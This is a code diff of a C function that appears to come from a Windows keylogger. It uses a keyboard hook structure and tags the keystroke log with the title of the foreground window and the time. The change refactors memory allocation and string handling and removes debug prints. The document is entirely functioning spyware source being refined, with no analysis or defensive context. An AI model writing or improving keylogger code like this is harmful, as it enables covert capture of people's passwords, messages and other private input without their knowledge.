@@ -26,26 +26,22 @@ int writeLogs (KBDLLHOOKSTRUCT kbdStruct, LPARAM lParam)
     if (hFile == INVALID_HANDLE_VALUE)
         return -1;
 
-    PSTR windowTitle;
+    char* windowTitle;
     HWND foreground = GetForegroundWindow();
     if (foreground)
     {
-        int cTxtLen = GetWindowTextLengthW(foreground);
-        printf("WINDOW LENGTH: %i", cTxtLen);
-        windowTitle = (PSTR) VirtualAlloc((LPVOID) NULL, (DWORD) (cTxtLen + 1), MEM_COMMIT, PAGE_READWRITE); 
-        GetWindowTextW(foreground, windowTitle, cTxtLen + 1);
-        // for (int i =0; i < cTxtLen; i++)
-        //     windowTitle[i] = 'a';
+        int cTxtLen = GetWindowTextLength(foreground) + 1;
+        windowTitle = LocalAlloc(LMEM_ZEROINIT, cTxtLen);
+        GetWindowText(foreground, windowTitle, cTxtLen);
 
         if (!currentWindow || currentWindow != foreground)
         {
             currentWindow = foreground;
             SYSTEMTIME st;
             GetLocalTime(&st);
-            PSTR header = (PSTR) VirtualAlloc((LPVOID) NULL, (DWORD) (cTxtLen + 1024), MEM_COMMIT, PAGE_READWRITE); 
-            snprintf(header, cTxtLen + 1024, "\n[%ls - %02d:%02d]\n", windowTitle, st.wHour, st.wMinute);
-            printf("GOT A CHANGE ADDING %s", header);
-            VirtualFree(windowTitle, 0, MEM_RELEASE); 
+            PSTR header = LocalAlloc(LMEM_ZEROINIT, cTxtLen + 1024);
+            snprintf(header, cTxtLen + 1024, "\n[%s] - %02d:%02d\n", windowTitle, st.wHour, st.wMinute);
+            LocalFree(windowTitle); 
             dwBytesToWrite = strlen(header);
             dwBytesWritten = 0;
             bErrorFlag = WriteFile( 
@@ -54,7 +50,7 @@ int writeLogs (KBDLLHOOKSTRUCT kbdStruct, LPARAM lParam)
                             dwBytesToWrite,
                             &dwBytesWritten,
                             NULL);
-            VirtualFree(header, 0, MEM_RELEASE); 
+            LocalFree(header); 
             if (FALSE == bErrorFlag)
                 goto handle_error;
         }
